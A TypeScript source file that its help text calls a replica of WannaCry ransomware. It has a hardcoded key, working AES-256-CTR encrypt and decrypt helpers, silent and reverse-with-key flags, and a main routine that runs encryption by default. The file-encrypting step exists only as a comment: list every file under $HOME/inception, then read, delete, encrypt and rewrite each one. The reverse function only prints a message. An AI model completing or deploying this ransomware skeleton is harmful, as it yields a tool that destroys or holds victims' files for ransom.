import * as crypto from "crypto";

const KEY: string = 'IThr1YRwjTxtrtzbM7RUbF0UdVDx9qNjYTryvf5s1Gih9xnSKl51INbX3NgPcQEJ3W-1ZtpJM1LP2gszMNqfWQ';
let silent_flag: number = 0;
let reversed: number = 0;
let display_ver = ():void => {
    console.log("Version 1.0");
}

let display_help = ():void => {
    console.log('This is a replica of WannaCry');
    console.log('--reverse/-r [KEY] : reverse the infection');
    console.log('--silent/-s : the program will not produce any output');
    console.log('--version/-v: display the version of the program');
}

const decrypt = (buff_encrypted: Buffer, algo: string, key: string): Buffer => {
    const iv = buff_encrypted.subarray(0, 16);
    buff_encrypted = buff_encrypted.subarray(16);
    const decipher = crypto.createDecipheriv(algo, key, iv);
    return Buffer.concat([decipher.update(buff_encrypted), decipher.final()]);
}

let reverse_file = (key: string):void => {
    console.log('all file reversed thank to key: ', key);
}

const encrypt = (buffer: string, algo:string, key: string): Buffer => {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(algo, key, iv);
    return Buffer.concat([iv, cipher.update(buffer), cipher.final()]);
}

let perform_encrypt = (): void => {
    const crypto = require('crypto');
    const algo: string = 'aes-256-ctr';
    let key = crypto.createHash('sha256').update(KEY).digest('base64').substring(0, 32);
    //create a list of all file inside $HOME/inception
    //for each file, read it/ delete it/ encrypt/ write itZ 
}



let main = (argv: any): void => {
    argv.shift();
    argv.shift(); // pop two first value (name of program,...)
    argv.forEach((value: any, index: number): void => {
        console.log('index = ', index);
        if (value === '-v' || value === '--version')
            display_ver();
        else if (value === '-h'  || value === '--help')
            display_help();
        else if (value === '-s'  || value === '--silent') {
            console.log('switching to silent version');
            silent_flag = 1;
        }
        else if (value === '-r' || value === '--reverse') {
            if (argv.length <= index + 1) {
                console.error('Cant find key after --reverse option');
                throw new Error("Runtime Error");
            }
            reverse_file(argv[index + 1]);
            argv.splice(index + 1, 1);
            reversed = 1;
        }
        else {
            console.error("Wrong flag");
            console.error('Aborting execution');
            throw new Error("Runtime Error");
        }

    })
    if (!reversed)
        perform_encrypt();
}
try {
    main(process.argv);
} catch (e) {
}
